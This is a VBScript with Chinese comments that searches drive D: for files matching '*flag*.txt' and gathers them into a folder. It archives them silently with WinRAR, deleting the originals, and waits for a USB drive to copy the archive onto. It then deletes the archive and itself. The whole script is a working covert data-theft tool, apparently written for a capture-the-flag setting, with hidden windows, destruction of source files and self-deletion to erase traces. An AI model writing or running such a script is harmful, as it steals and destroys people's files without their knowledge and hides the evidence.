On Error Resume Next
'查找指定的文件
'纯vbs的话要递归遍历所有文件夹，比较麻烦，可以和cmd结合起来用
targetfile="*flag*.txt" '改成你要找的文件名,进行模糊查询
Set WshShell = WScript.CreateObject("Wscript.Shell")
Set fso = WScript.CreateObject("Scripting.Filesystemobject")

tempfile=WScript.ScriptName&"_temp.txt" '存找到的文件目录的临时文件
wshshell.Run "cmd /c dir d:\"&targetfile&"/b /s>"&tempfile,0,True
Set f=fso.GetFile(tempfile)
If f.Size>0 Then
'dir找到目标文件时会向tempfile中写入数据，
	Set ft=fso.OpenTextFile(tempfile,1)
	fso.CreateFolder "d:\fn"
	Do Until ft.AtEndOfStream '可能会找到多个文件，故需要读每一行的数据
		line=ft.ReadLine '读入一行
		fso.CopyFile line,"d:\fn\",false
	Loop
	ft.Close
End If
fso.DeleteFile(tempfile)'删除生成的临时文件

'压缩文件
des="d:\fn.rar"
sou="d:\fn"
WshShell.Run "cd C:\Program Files\WinRAR ",0,True
WshShell.Run "winrar m -r -epl -ibck "& Chr(34)&des&Chr(34)&" "&Chr(34)&sou&chr(34),0,True
' 实现后台压缩完后删除原文件 ，Chr(34)为解决双引号里面套双引号的问题
'检测有无U盘插入并将压缩包发到U盘中
dim dc,d,flag
flag=0
do
if flag=1 then exit do
Set dc = fso.Drives
For Each d in dc
      If d.DriveType = 1 Then
		If u="" Then
		    u=d.DriveLetter
			add = u&":/"			
			fso.CopyFile "d:\fn.rar",add,false '复制文件到u盘
			flag = 1
		End if
	  u=""
      End if
WScript.Sleep 5000 
Next
loop

WScript.Sleep 10000
fso.DeleteFile "d:\fn.rar" '删除压缩包
fso.DeleteFile(WScript.ScriptFullName)'自删除
